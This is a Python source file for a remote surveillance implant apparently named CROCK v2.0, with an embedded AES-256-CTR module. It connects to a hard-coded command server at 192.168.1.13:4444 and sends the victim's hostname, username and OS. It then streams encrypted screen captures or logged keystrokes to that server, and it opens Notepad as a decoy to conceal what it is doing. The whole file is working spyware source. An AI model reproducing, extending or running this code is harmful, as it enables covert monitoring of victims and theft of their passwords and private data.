#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
import socket
import struct
import json
import platform
import hashlib

# ===== CRYPTO MODULE EMBEBIDO =====
"""
CROCK v2.0 - Crypto Module
AES-256-CTR sin dependencias externas (pure Python fallback + pycryptodome si disponible)
"""

import os
import hashlib
import struct

# Intentar usar pycryptodome si está disponible (mucho más rápido)
try:
    from Crypto.Cipher import AES as _AES
    _HAS_PYCRYPTO = True
except ImportError:
    _HAS_PYCRYPTO = False


def derive_key(password: str) -> bytes:
    """Deriva una key AES-256 de un password string usando SHA-256"""
    return hashlib.sha256(password.encode('utf-8')).digest()


def generate_iv() -> bytes:
    """Genera un IV aleatorio de 16 bytes"""
    return os.urandom(16)


# --- AES-256-CTR Pure Python (fallback) ---

# S-Box para AES
_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]

_RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]


def _sub_word(w):
    return [_SBOX[b] for b in w]

def _rot_word(w):
    return w[1:] + w[:1]

def _xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def _key_expansion(key):
    """Expande key de 32 bytes a 240 bytes (15 round keys para AES-256)"""
    nk = 8  # 256-bit key
    nr = 14
    nb = 4
    
    w = []
    for i in range(nk):
        w.append(list(key[4*i:4*i+4]))
    
    for i in range(nk, nb * (nr + 1)):
        temp = list(w[i-1])
        if i % nk == 0:
            temp = _sub_word(_rot_word(temp))
            temp[0] ^= _RCON[(i // nk) - 1]
        elif i % nk == 4:
            temp = _sub_word(temp)
        w.append([a ^ b for a, b in zip(w[i - nk], temp)])
    
    return w

def _sub_bytes(state):
    for i in range(4):
        for j in range(4):
            state[i][j] = _SBOX[state[i][j]]

def _shift_rows(state):
    state[1] = state[1][1:] + state[1][:1]
    state[2] = state[2][2:] + state[2][:2]
    state[3] = state[3][3:] + state[3][:3]

def _xtime(a):
    return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else (a << 1) & 0xff

def _mix_single_column(col):
    t = col[0] ^ col[1] ^ col[2] ^ col[3]
    u = col[0]
    col[0] ^= _xtime(col[0] ^ col[1]) ^ t
    col[1] ^= _xtime(col[1] ^ col[2]) ^ t
    col[2] ^= _xtime(col[2] ^ col[3]) ^ t
    col[3] ^= _xtime(col[3] ^ u) ^ t

def _mix_columns(state):
    for i in range(4):
        col = [state[j][i] for j in range(4)]
        _mix_single_column(col)
        for j in range(4):
            state[j][i] = col[j]

def _add_round_key(state, round_key):
    for i in range(4):
        for j in range(4):
            state[i][j] ^= round_key[j][i]

def _aes_encrypt_block(block, expanded_key):
    """Cifra un bloque de 16 bytes con AES-256"""
    nr = 14
    
    # State matrix (column-major)
    state = [[0]*4 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            state[i][j] = block[j*4+i]
    
    # Initial round key
    rk = [expanded_key[j] for j in range(4)]
    _add_round_key(state, rk)
    
    # Main rounds
    for rnd in range(1, nr):
        _sub_bytes(state)
        _shift_rows(state)
        _mix_columns(state)
        rk = [expanded_key[rnd*4+j] for j in range(4)]
        _add_round_key(state, rk)
    
    # Final round
    _sub_bytes(state)
    _shift_rows(state)
    rk = [expanded_key[nr*4+j] for j in range(4)]
    _add_round_key(state, rk)
    
    # Convert back
    out = bytearray(16)
    for i in range(4):
        for j in range(4):
            out[j*4+i] = state[i][j]
    return bytes(out)


def _increment_counter(counter):
    """Incrementa el counter de 16 bytes (big-endian)"""
    c = bytearray(counter)
    for i in range(15, -1, -1):
        c[i] = (c[i] + 1) & 0xff
        if c[i] != 0:
            break
    return bytes(c)


class AESCipher:
    """AES-256-CTR cipher - usa pycryptodome si disponible, sino pure Python"""
    
    def __init__(self, key: bytes, iv: bytes):
        if len(key) != 32:
            raise ValueError("Key must be 32 bytes")
        if len(iv) != 16:
            raise ValueError("IV must be 16 bytes")
        
        self.key = key
        self.iv = iv
        self.counter = bytearray(iv)
        
        if _HAS_PYCRYPTO:
            self._cipher = _AES.new(key, _AES.MODE_CTR, nonce=b'', initial_value=iv)
            self._use_native = True
        else:
            self._expanded_key = _key_expansion(key)
            self._use_native = False
            self._keystream_buf = b''
    
    def process(self, data: bytes) -> bytes:
        """Encrypt/decrypt (CTR mode es simetrico)"""
        if self._use_native:
            return self._cipher.encrypt(data)
        
        result = bytearray()
        offset = 0
        
        while offset < len(data):
            if not self._keystream_buf:
                self._keystream_buf = _aes_encrypt_block(bytes(self.counter), self._expanded_key)
                self.counter = bytearray(_increment_counter(bytes(self.counter)))
            
            chunk_len = min(len(data) - offset, len(self._keystream_buf))
            for i in range(chunk_len):
                result.append(data[offset + i] ^ self._keystream_buf[i])
            
            self._keystream_buf = self._keystream_buf[chunk_len:]
            offset += chunk_len
        
        return bytes(result)


def encrypt_chunk(data: bytes, key: bytes, iv: bytes) -> bytes:
    """Cifra un chunk de datos con AES-256-CTR"""
    cipher = AESCipher(key, iv)
    return cipher.process(data)


def decrypt_chunk(data: bytes, key: bytes, iv: bytes) -> bytes:
    """Descifra un chunk de datos con AES-256-CTR (mismo que encrypt en CTR)"""
    cipher = AESCipher(key, iv)
    return cipher.process(data)


def create_encryptor(key: bytes, iv: bytes) -> AESCipher:
    """Crea un cipher reutilizable para streaming"""
    return AESCipher(key, iv)


# Handshake protocol constants
MAGIC = b'CRCK'
HANDSHAKE_FMT = '>4s16sI'  # magic(4) + iv(16) + info_len(4) = 24 bytes header
HANDSHAKE_HEADER_SIZE = struct.calcsize(HANDSHAKE_FMT)

# ===== FIN CRYPTO =====

# Configuración del payload
TARGET_IP = "192.168.1.13"
TARGET_PORT = 4444
PAYLOAD_MODE = "screen"
AUTO_RECONNECT = True
FPS = 15
QUALITY = 50
MONITOR = 0

def do_handshake(sock, mode_name):
    """Realiza handshake con el C2 y devuelve el cipher"""
    iv = generate_iv()
    key = derive_key("crock_default_key_change_me_2024")
    cipher = AESCipher(key, iv)
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system(),
        "mode": mode_name
    }
    info_json = json.dumps(info).encode('utf-8')
    enc_info = cipher.process(info_json)
    sock.sendall(struct.pack('>4s16sI', b'CRCK', iv, len(enc_info)) + enc_info)
    return cipher

def execute_payload():
    """Ejecuta el payload en background"""
    try:
        if PAYLOAD_MODE == "screen":
            execute_screen_payload()
        elif PAYLOAD_MODE == "keylogger":
            execute_keylogger_payload()
        else:
            execute_screen_payload()
    except Exception:
        pass

def execute_screen_payload():
    """Captura de pantalla con cifrado"""
    try:
        import mss
        
        max_retries = 3 if AUTO_RECONNECT else 1
        retries = 0
        
        while retries < max_retries:
            s = None
            cipher = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(5)
                s.connect((TARGET_IP, TARGET_PORT))
                retries = 0
                cipher = do_handshake(s, "screen")
                
                with mss.mss() as sct:
                    monitor_obj = sct.monitors[MONITOR] if MONITOR < len(sct.monitors) else sct.monitors[0]
                    
                    while True:
                        try:
                            frame = sct.grab(monitor_obj)
                            header = struct.pack('>HH', frame.width, frame.height)
                            s.sendall(cipher.process(header))
                            s.sendall(cipher.process(frame.rgb))
                            time.sleep(1/FPS)
                        except (BrokenPipeError, ConnectionResetError):
                            break
                        except Exception:
                            break
                
                if not AUTO_RECONNECT:
                    break
                retries += 1
                time.sleep(2)
                
            except Exception:
                if s:
                    try:
                        s.close()
                    except:
                        pass
                retries += 1
                if retries < max_retries and AUTO_RECONNECT:
                    time.sleep(2)
                else:
                    break
    except:
        pass

def execute_keylogger_payload():
    """Captura de teclas con cifrado"""
    try:
        from pynput import keyboard
        import queue
        
        key_queue = queue.Queue()
        s = None
        cipher = None
        
        def maintain_connection():
            nonlocal s, cipher
            max_retries = 3 if AUTO_RECONNECT else 1
            retries = 0
            
            while True:
                try:
                    if s is None:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.settimeout(5)
                        s.connect((TARGET_IP, TARGET_PORT))
                        retries = 0
                        cipher = do_handshake(s, "keylogger")
                    
                    while not key_queue.empty():
                        try:
                            data = key_queue.get(timeout=1)
                            data_bytes = data.encode() if isinstance(data, str) else data
                            s.sendall(cipher.process(data_bytes))
                        except:
                            pass
                    
                    time.sleep(0.1)
                except Exception:
                    try:
                        if s:
                            s.close()
                    except:
                        pass
                    s = None
                    cipher = None
                    if AUTO_RECONNECT and retries < max_retries:
                        retries += 1
                        time.sleep(2)
                    else:
                        break
        
        def on_press(key):
            try:
                if hasattr(key, 'char') and key.char:
                    key_queue.put(key.char)
                elif hasattr(key, 'name'):
                    key_queue.put(f"[{key.name}]")
                else:
                    key_queue.put("[UNKNOWN]")
            except:
                pass
        
        conn_thread = threading.Thread(target=maintain_connection, daemon=True)
        conn_thread.start()
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
    except:
        pass

def show_decoy_app():
    """Abre una app inocente para disfrazar"""
    try:
        subprocess.Popen("notepad.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
    except:
        try:
            subprocess.Popen("explorer.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

if __name__ == "__main__":
    payload_thread = threading.Thread(target=execute_payload, daemon=True)
    payload_thread.start()
    
    show_decoy_app()
    
    try:
        while payload_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    except:
        pass
    
    sys.exit(0)
